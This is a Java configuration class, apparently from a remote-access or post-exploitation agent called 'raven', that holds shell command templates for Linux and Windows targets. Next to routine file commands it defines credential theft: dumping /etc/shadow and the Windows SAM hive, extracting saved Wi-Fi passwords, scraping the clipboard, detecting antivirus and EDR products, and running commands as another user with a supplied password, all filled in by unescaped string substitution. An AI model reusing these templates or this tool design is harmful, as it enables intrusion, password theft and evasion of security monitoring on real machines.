package com.raven.core.command;

import com.raven.core.output.Logger;
import com.raven.utils.RavenConstants;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Properties;

public final class CmdDispatchConfig {

    private static final Properties Props = new Properties();

    static {
        LoadDefaults();
        LoadFromFile();
    }

    private CmdDispatchConfig() {}

    private static void Def(String Key, String Value) {
        Props.setProperty(Key, Value);
    }

    private static void LoadDefaults() {
        Def("linux.ls", "ls -la \"{PATH}\"");
        Def("linux.pwd", "pwd");
        Def("linux.cd", "cd \"{PATH}\"");
        Def("linux.cat", "cat \"{FILE}\"");
        Def("linux.head", "head -n {LINES} \"{FILE}\"");
        Def("linux.tail", "tail -n {LINES} \"{FILE}\"");
        Def("linux.rm", "rm -rf \"{PATH}\"");
        Def("linux.mkdir", "mkdir -p \"{PATH}\"");
        Def("linux.cp", "cp -r \"{SRC}\" \"{DST}\"");
        Def("linux.mv", "mv \"{SRC}\" \"{DST}\"");
        Def("linux.chmod", "chmod {ARGS}");
        Def("linux.find", "find \"{PATH}\" -name \"{NAME}\" 2>/dev/null");
        Def("linux.grep", "grep -n \"{PATTERN}\" \"{FILE}\"");
        Def("linux.hash.sha256", "sha256sum \"{FILE}\"");
        Def("linux.hash.md5", "md5sum \"{FILE}\"");
        Def("linux.whoami", "whoami");
        Def("linux.id", "id");
        Def("linux.hostname", "hostname");
        Def("linux.uname", "uname -a");
        Def("linux.ps", "ps aux --sort=-%cpu");
        Def("linux.env", "env");
        Def("linux.netstat", "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null");
        Def("linux.ifconfig", "ip addr show 2>/dev/null || ifconfig 2>/dev/null");
        Def("linux.arp", "arp -n 2>/dev/null || ip neigh 2>/dev/null");
        Def("linux.route", "ip route 2>/dev/null || route -n 2>/dev/null");
        Def("linux.users", "awk -F: '$3>=1000||$3==0{print $1,$3,$6,$7}' /etc/passwd");
        Def("linux.groups", "groups");
        Def("linux.services", "systemctl list-units --type=service --state=running --no-pager 2>/dev/null || service --status-all 2>/dev/null");
        Def("linux.privcheck", "id; sudo -l 2>/dev/null");
        Def("linux.antivirus", "ps aux | grep -iE 'clamav|sophos|eset|avast|bitdefender|crowdstrike|falcon|sentinel|cylance'");
        Def("linux.crontab", "crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null");
        Def("linux.clipboard", "xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || wl-paste 2>/dev/null || echo '[no clipboard tool]'");
        Def("linux.wifidump", "nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null || grep -r 'psk=' /etc/NetworkManager/system-connections/ 2>/dev/null || echo '[nmcli not found]'");
        Def("linux.lastlog", "last -n 20 2>/dev/null || lastlog 2>/dev/null");
        Def("linux.hashdump", "cat /etc/shadow 2>/dev/null || echo 'permission denied'");
        Def("linux.searchfiles", "find / -name \"{ARGS}\" 2>/dev/null");
        Def("linux.runas", "echo '{PASS}' | su - {USER} -c '{CMD}' 2>&1");

        Def("windows.ls", "dir \"{PATH}\"");
        Def("windows.pwd", "cd");
        Def("windows.cd", "cd /d \"{PATH}\"");
        Def("windows.cat", "type \"{FILE}\"");
        Def("windows.head", "powershell -NoProfile -Command \"Get-Content -Head {LINES} \\\"{FILE}\\\"\"");
        Def("windows.tail", "powershell -NoProfile -Command \"Get-Content -Tail {LINES} \\\"{FILE}\\\"\"");
        Def("windows.rm", "cmd /c (del /f /q \"{PATH}\" 2>&1 || rmdir /s /q \"{PATH}\" 2>&1)");
        Def("windows.mkdir", "mkdir \"{PATH}\"");
        Def("windows.cp", "copy \"{SRC}\" \"{DST}\"");
        Def("windows.mv", "move \"{SRC}\" \"{DST}\"");
        Def("windows.chmod", "icacls {ARGS}");
        Def("windows.find", "where /r \"{PATH}\" \"{NAME}\" 2>&1");
        Def("windows.grep", "findstr /i \"{PATTERN}\" \"{FILE}\"");
        Def("windows.hash.sha256", "certutil -hashfile \"{FILE}\" SHA256");
        Def("windows.hash.md5", "certutil -hashfile \"{FILE}\" MD5");
        Def("windows.whoami", "whoami /all");
        Def("windows.id", "whoami /groups");
        Def("windows.hostname", "hostname");
        Def("windows.uname", "ver");
        Def("windows.ps", "tasklist /v");
        Def("windows.env", "set");
        Def("windows.netstat", "netstat -an");
        Def("windows.ifconfig", "ipconfig /all");
        Def("windows.arp", "arp -a");
        Def("windows.route", "route print");
        Def("windows.users", "net user");
        Def("windows.groups", "net localgroup");
        Def("windows.services", "sc query state= all");
        Def("windows.privcheck", "whoami /priv && net localgroup administrators");
        Def("windows.antivirus", "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayName 2>&1");
        Def("windows.crontab", "schtasks /query /fo LIST /v");
        Def("windows.clipboard", "powershell -NoProfile -Command \"[System.Windows.Forms.Clipboard]::GetText()\"");
        Def("windows.wifidump", "powershell -NoProfile -Command \"(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $p=($_ -split ':')[1].Trim(); netsh wlan show profile name=$p key=clear }\"");
        Def("windows.lastlog", "wevtutil qe Security /q:\"*[System[EventID=4624]]\" /c:10 /f:text 2>&1");
        Def("windows.hashdump", "reg save HKLM\\SAM sam.bak 2>&1");
        Def("windows.searchfiles", "where /r C:\\ {ARGS} 2>&1");
        Def("windows.runas", "runas /user:{USER} \"{CMD}\"");

        Def("common.osquery", "osqueryi --line \"{ARGS}\"");
    }

    private static void LoadFromFile() {
        if (!Files.exists(Paths.get(RavenConstants.CmdDispatchPath))) return;
        try (FileInputStream In = new FileInputStream(RavenConstants.CmdDispatchPath)) {
            Props.load(In);
        } catch (IOException E) {
            Logger.Error("CmdDispatchConfig: failed to load " + RavenConstants.CmdDispatchPath + " — " + E.getMessage());
        }
    }

    public static String Get(boolean IsWindows, String Cmd) {
        String Os = IsWindows ? "windows" : "linux";
        String Val = Props.getProperty(Os + "." + Cmd);
        if (Val != null) return Val;
        return Props.getProperty("common." + Cmd);
    }

    public static String Resolve(boolean IsWindows, String Cmd, String... KvPairs) {
        String Template = Get(IsWindows, Cmd);
        if (Template == null) return null;
        for (int I = 0; I + 1 < KvPairs.length; I += 2) {
            Template = Template.replace("{" + KvPairs[I] + "}", KvPairs[I + 1]);
        }
        return Template;
    }
}
